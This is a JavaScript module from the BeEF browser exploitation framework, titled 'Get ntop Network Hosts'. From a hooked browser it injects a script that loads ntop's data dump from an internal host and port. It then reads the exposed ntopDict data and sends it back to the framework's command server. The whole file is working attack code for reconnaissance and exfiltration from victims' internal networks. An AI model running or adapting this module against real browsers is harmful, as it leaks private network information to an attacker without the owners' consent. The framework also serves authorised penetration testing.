//
// Copyright (c) 2006-2017 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

beef.execute(function() {
  var rhost = '<%= @rhost %>';
  var rport = '<%= @rport %>';

  load_script = function(url) {
    beef.debug("[Get ntop Network Hosts] Loading: " + url);
    var s = document.createElement("script");
    s.type = 'text/javascript';
    s.src  = url;
    document.body.appendChild(s);
  }

  read_ntop = function() {
    try {
      var result = JSON.stringify(ntopDict);
      beef.debug("[Get ntop Network Hosts] Success: Found ntop data (" + result.length + ' bytes)');
      beef.net.send("<%= @command_url %>", <%= @command_id %>, "proto=http&ip=<%= @rhost %>&port=<%= @rport %>&data="+result, beef.are.status_success());
    } catch(e) {
      beef.debug("[Get ntop Network Hosts] Error: Did not find ntop");
      beef.net.send("<%= @command_url %>", <%= @command_id %>, 'result=did not find ntop', beef.are.status_error());
      return;
    }
  }

  load_script("http://"+rhost+":"+rport+"/dumpData.html?language=python&view=long");
  setTimeout("read_ntop()", 10000);

});

